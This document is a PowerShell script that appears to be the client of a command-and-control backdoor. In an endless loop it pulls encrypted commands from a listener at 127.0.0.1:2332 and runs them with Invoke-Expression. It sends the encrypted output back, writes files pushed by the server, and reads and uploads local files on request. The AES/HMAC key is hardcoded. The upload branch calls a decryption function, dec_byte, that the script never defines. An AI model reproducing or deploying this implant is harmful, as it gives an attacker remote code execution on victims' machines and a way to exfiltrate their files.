
while ($true)
{
    write-host "key = helloworldhello1"
    $web = new-object system.net.webclient
    $web.headers.add([System.Net.HttpRequestHeader]::UserAgent, "payload")
    $rec = $web.downloadstring("http://127.0.0.1:2332/")
    write-host "command encrypted: $rec"
    $key = "helloworldhello1"
    function dec ($bb)
    {
        
        if ($bb.Length -gt 32)
        {
            $mac = $bb[-20..-1]
            $bb = $bb[0..($bb.length - 21)]
            $hmac = New-Object System.Security.Cryptography.HMACSHA1
            $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
            $exp = $hmac.ComputeHash($bb)
            if (@(Compare-Object $mac $exp -Sync 0).Length -ne 0)
            {
                return
            }
                
            $iv = $bb[0..15]
            $enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $enc.Mode = "CBC"
            $enc.Key = [System.Text.Encoding]::utf8.GetBytes($key)
            $enc.IV = $iv
            $byteee = ($enc.CreateDecryptor()).TransformFinalBlock(($bb[16..$bb.length]), 0, $bb.length-16)
            [System.Text.Encoding]::UTF8.GetString($byteee)
        }
    }
    function enc ($b)
    {
        $b = [System.Text.Encoding]::UTF8.GetBytes($b)
        $iv = [byte] 0..255 |Get-Random -Count 16
        $enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        $enc.Mode = "CBC";
        $enc.Key = [System.Text.Encoding]::UTF8.GetBytes($key);
        $enc.IV = $iv;
        $txt = $iv + ($enc.CreateEncryptor()).TransformFinalBlock($b, 0, $b.Length);
        $mac = New-Object System.Security.Cryptography.HMACSHA1;
        $mac.Key = [System.Text.Encoding]::utf8.GetBytes($key);
        $txt + $mac.ComputeHash($txt);
    }
    $rec = $rec -split (' ')
    $rec = dec -bb $rec
    write-host "raw command:$rec"
    if ($rec -eq "upload")
    {
        $web = new-object system.net.webclient
        $web.headers.add([System.Net.HttpRequestHeader]::UserAgent, "payload")
        $web.uploadstringasync("http://127.0.0.1:2332", "ready")

        $web = new-object system.net.webclient
        $web.headers.add([System.Net.HttpRequestHeader]::UserAgent, "payload")
        $byte = $web.downloadstring("http://127.0.0.1:2332")
        $byte = dec_byte -bb $byte
        [string]$bb = $byte
        [byte[]]$b = $bb -split ' '
        [system.io.file]::writeallbytes("uploaded", $b)
    } elseif ($rec -eq "download")
    {
        $web = new-object system.net.webclient
        $web.headers.add([System.Net.HttpRequestHeader]::UserAgent, "payload")
        $web.uploadstringasync("http://127.0.0.1:2332", "ready")

        $web = new-object system.net.webclient
        $web.headers.add([System.Net.HttpRequestHeader]::UserAgent, "payload")
        $name = $web.downloadstring("http://127.0.0.1:2332")

        $web = new-object system.net.webclient
        $web.headers.add([System.Net.HttpRequestHeader]::UserAgent, "payload")
        $web.uploadstringasync("http://127.0.0.1:2332", "[+] writing bytes")
        
        [byte[]] $read = cat $name -Encoding Byte
        [System.IO.File]::WriteAllLines("$((pwd).Path)\tmp", ([string]$read))

        $web = new-object system.net.webclient
        $web.headers.add([System.Net.HttpRequestHeader]::UserAgent, "payload")
        $web.uploadstringasync("http://127.0.0.1:2332", "$(cat tmp)")
        
    } else {
        try{
            $es = $(iex [string]$rec)
            write-host "result raw = $es"
            $es = enc -b $es
            write-host "result encrypted = $es"

            $web = new-object system.net.webclient
            $web.headers.add([System.Net.HttpRequestHeader]::UserAgent, "payload")
            $web.uploadstringAsync("http://127.0.0.1:2332","$es")
        } catch {
            $web = new-object system.net.webclient
            $web.headers.add([System.Net.HttpRequestHeader]::UserAgent, "payload")
            $es = enc -b $_
            $web.uploadstringAsync("http://127.0.0.1:2332/","$es")
        }
    }
}


